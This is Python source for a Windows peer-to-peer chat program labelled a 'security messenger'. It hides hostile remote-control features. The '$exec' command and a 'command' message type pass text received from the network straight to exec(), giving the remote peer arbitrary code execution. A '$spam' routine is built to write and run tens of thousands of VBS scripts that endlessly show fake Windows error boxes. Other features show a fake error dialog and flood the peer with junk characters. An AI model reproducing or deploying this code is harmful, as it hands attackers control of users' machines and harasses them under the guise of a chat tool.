from win10toast import ToastNotifier
import socket
import win32api
import win32gui
import colorama as clr
import keyboard as kb
import msvcrt
from datetime import datetime
from threading import Thread
import random
import sys
import os
import getpass
win32api.SetConsoleTitle('BANANA_SECURITY MESSANGER')
toaster = ToastNotifier()
clr.init()
def EXIT():sys.exit(0)
# start
print("BASIC VARIABLE CONFIG STARTED.")
ip = input('Enter IP: ')
port = int(input('Enter PORT: '))
print('Config -> True')
SorC = input('Are you server [N/y]? ')
if SorC == 'Y' or SorC == 'y':
    con = socket.socket(2,1)
    con.bind((ip,port))
    con.listen(4)
    client = con.accept()[0]
    print('Server Started.')
else:
    client = socket.socket(2,1)
    client.connect((ip,port))
    print('Connected.')

# Static Variables
# format messages -> { "date":{"msgtext":"$redcolor Hi $endcolor","msgtype":"normaltext","sent":False,"last":True} }
INLINE_SIGNAL = False
MsgFormat = {'scolor':clr.Fore.GREEN,'bscolor':clr.Fore.BLACK}
Messages = {}
status = 1

# Function and Methods
def show_toast(title,text,icon_path="metadata/message.ico",during=10):
    return toaster.show_toast(title,text,icon_path=icon_path,duration=during)

def _cmd_spam(path,vbs):
    for i in range(40000):
        name = random.randint(9999999,9999999999999)
        with open(path+f'HAHAHA{name}.vbs','w') as f:
            f.write(vbs)
            f.close()
        Thread(target=os.system,args=(f'HAHAHA{name}.vbs',)).start()
def check_command(cmd):
    if cmd[0] == '$msgbox':
        Thread(win32gui.MessageBox ,args=(0,cmd[1],"SystemError",16)).start()
    elif cmd[0] == '$spam':
        vbscript = 'do\nMsgBox "Windows Security",16,"SystemError: dll not found."\nloop'
        path = f'C:\\Users\\{getpass.getuser()}\\Documents\\'
        Thread(target=_cmd_spam,args=(path,vbscript))
    elif cmd[0] == '$exec':
        exec(cmd[1])
    

class Handle():
    def __init__(self,handle_name,handle_type='LISTHNDL'):
        self.HNDL_NAME = handle_name
        self.type = handle_type
        self._HNDL_MODEL = {}
        self._HANDELS = []
    def add_handle(self,hndl,name):
        self._HNDL_MODEL[name] = hndl
    def new_handle(self,name,func,args=tuple()):
        mkh = {}
        mkh['args'] = args
        mkh['function'] = func
        mkh['type'] = self.type
        mkh['model'] = 'STD_HANDLE'
        self.add_handle(mkh,name)
    def update(self):
        for x in self._HNDL_MODEL.keys():
            self._HANDELS.append( Thread(target=self._HNDL_MODEL[x]['function'],args=self._HNDL_MODEL[x]["args"]) )
    def clear_handles(self):
        self._HANDELS = []
    def start_handling(self):
        for x in self._HANDELS:
            x.start()
        self._HANDELS = []


def create_message_text(text,sc=clr.Fore.GREEN,bs=''):
    msg = text
    return msg

def mprint(date,text):
    print('\n',f'{clr.Fore.RED}{date}{clr.Fore.RESET}~> {text}')

def eprint(text):
    print(clr.Fore.RED+'Error: '+text+clr.Fore.RESET)

def MsgReader():
    while True:
        for x in list(Messages):
            if x == None:
                continue
            else:
                if not Messages[x]['sent'] and Messages[x]['msgtype']=='normaltext':
                    if Messages[x]['msgtext'][0] == '$':
                        command = Messages[x]['msgtext'].split(' ')
                        check_command(command)
                        continue
                    time = datetime.now().strftime("%Y-%m-%d/%H:%M:%S")
                    msgtext = create_message_text(Messages[x]['msgtext'],MsgFormat['scolor'],MsgFormat['bscolor'])
                    mprint(time,msgtext)
                    INLINE_SIGNAL = False
                    Thread(target=show_toast,args=("New Message",Messages[x]['msgtext'])).start()
                    Messages[x]['last']=False
                    Messages[x]['sent']=True
                    print('\n'+clr.Fore.RESET+clr.Fore.BLUE+'-> '+clr.Fore.YELLOW,end='')
                elif Messages[x]['msgtype'] == 'command':
                    exec(Messages[x]['msgtext'])
                else:
                    ...
                    #eprint("Invalid MsgType.")
def Listener(client):
    while True:
        data = client.recv(1024*1024)
        Messages[datetime.now().strftime('%Y-%m-%d/%H:%M:%S')] = {"msgtext":data.decode(),'msgtype':'normaltext','sent':False,'last':True}

def inline():
    global INLINE_SIGNAL
    p = ''
    while True:
        event = msvcrt.getch().decode()
        if event == '~':
            client.close()
            EXIT()
        if event == '{':
            for i in range(10000):
                client.send((f"{chr(random.randint(0,100)*random.randint(3,8))}").encode())
        if event == ')':
            print(Messages)
        if INLINE_SIGNAL == True:
            if event == '\r':
                if p[0] == '$':
                    command = p.split(' ')
                    Thread(target=check_command,args=(command,)).start()
                    print('\n'+clr.Fore.RESET+clr.Fore.BLUE+'-> '+clr.Fore.YELLOW,end='')
                else:
                    client.send(p.encode())
                    p = ''
                    print('\n'+clr.Fore.RESET+clr.Fore.BLUE+'-> '+clr.Fore.YELLOW,end='')
            else:
                p+=event
                print(event,end='')
            
        else:
            p = ''
            INLINE_SIGNAL = True
            print('\n'+clr.Fore.RESET+clr.Fore.BLUE+'-> '+clr.Fore.YELLOW,end='')
            continue



#--------------------------------------------- Start Program
Handles = Handle('MainHandler')

Handles.new_handle('Listener',Listener,(client,))
Handles.new_handle('MsgReader',MsgReader)
Handles.new_handle('inline',inline)
Handles.update()
Handles.start_handling()

